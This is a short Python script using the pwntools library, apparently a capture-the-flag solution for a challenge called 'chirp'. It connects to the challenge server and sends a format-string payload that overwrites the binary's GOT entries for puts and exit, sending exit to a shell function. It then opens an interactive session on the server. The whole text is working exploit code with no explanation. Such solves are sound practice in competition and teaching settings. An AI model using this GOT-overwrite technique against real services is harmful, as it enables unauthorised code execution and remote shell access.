#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './chirp')
libc = ELF(exe.libc.path)

io = remote("chirp.challs.pwnoh.io", 1337, ssl=True)
io.sendlineafter(b": ", fmtstr_payload(6, {exe.got.puts: 0x4012b5, exe.got.exit: exe.sym.shell}))
io.interactive()
